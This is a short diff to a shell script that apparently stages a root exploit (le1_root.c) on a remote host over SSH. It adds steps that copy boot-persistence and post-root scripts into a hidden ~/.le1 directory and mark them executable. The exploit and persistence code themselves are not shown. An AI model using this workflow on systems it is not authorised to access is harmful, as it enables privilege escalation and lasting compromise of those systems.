@@ -38,6 +38,13 @@ if [ "$MODE" != "--run" ]; then
 
     echo "[*] Staging exploit source"
     ssh_cmd 'cat > le1_root.c' < "$REPO/exploit/le1_root.c"
+
+    echo "[*] Staging boot persistence -> ~/.le1/"
+    ssh_cmd 'mkdir -p ~/.le1'
+    scp -P "$SSH_PORT" "$REPO/boot/le1-boot.sh"          "$SSH_HOST:.le1/le1-boot.sh"
+    scp -P "$SSH_PORT" "$REPO/boot/install-recovery.sh"  "$SSH_HOST:.le1/install-recovery.sh"
+    scp -P "$SSH_PORT" "$REPO/post-root/persist.sh"      "$SSH_HOST:.le1/persist.sh"
+    ssh_cmd 'chmod 755 ~/.le1/*.sh'
 fi
 
 if [ "$MODE" = "--stage-only" ]; then
